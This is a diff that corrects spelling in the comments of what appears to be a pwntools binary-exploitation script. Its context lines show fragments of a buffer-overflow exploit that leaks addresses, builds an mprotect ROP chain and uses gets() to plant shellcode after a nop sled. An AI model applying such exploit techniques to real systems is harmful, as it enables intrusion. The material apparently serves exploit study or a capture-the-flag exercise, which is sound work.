@@ -39,11 +39,11 @@ r.recv()
 r.sendline(payload)
 
 
-# recieve the output from the remote process and split by newline
+# receive the output from the remote process and split by newline
 # splitting enables us to extract just the addresses that we want
 # the addresses are stored in output[6]
 
-# recieve a line before recieving the memory addresses
+# receive a line before recieving the memory addresses
 r.recv()
 
 # Splitting program output to extract the addresses (at output[3])
@@ -94,7 +94,7 @@ mprotect_payload = offset + mprotect_addr_bytes + main + base_address_bytes + le
 # calling gets() to write shellcode to x position in memory
 # Passing the return address for gets() as the base of libc so after the gets() call
 # it will return to the base of libc and hit our nopsled then run the shellcode
-# Arguement for gets() is the location, provide base address of libc
+# Argument for gets() is the location, provide base address of libc
 gets_payload = offset + gets_address_bytes + base_address_bytes + base_address_bytes 
 
 
